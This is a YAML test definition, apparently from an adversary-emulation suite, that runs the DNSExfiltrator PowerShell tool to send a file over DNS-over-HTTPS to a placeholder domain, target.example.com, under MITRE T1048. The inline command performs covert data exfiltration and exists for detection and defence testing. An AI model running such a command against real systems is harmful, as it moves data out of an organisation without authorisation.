api_version: "2.0"
name: DNSExfiltration (doh)
description: "DNSExfiltrator enables the transfer (exfiltration) of a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n"
args:
    - name: ps_module
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\dnsexfil.ps1
    - name: doh
      type: string
      default: google
    - name: time
      type: string
      default: "500"
    - name: encoding
      type: string
      default: <nil>
    - name: password
      type: string
      default: atomic
    - name: domain
      type: string
      default: target.example.com
uuid: c943d285-ada3-45ca-b3aa-7cd6500c6a48
mitre:
    tactics:
        - 'TA0010: Exfiltration'
    techniques:
        - 'T1048: Exfiltration Over Alternative Protocol'
requirements:
    platforms:
        - os: windows
steps:
    - name: dnsexfiltration-(doh)
      inline: |
        Import-Module "{{.Args.ps_module}}"
        Invoke-DNSExfiltrator -i "{{.Args.ps_module}}" -d {{.Args.domain}} -p {{.Args.password}} -doh {{.Args.doh}} -t {{.Args.time}} {{.Args.encoding}}
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
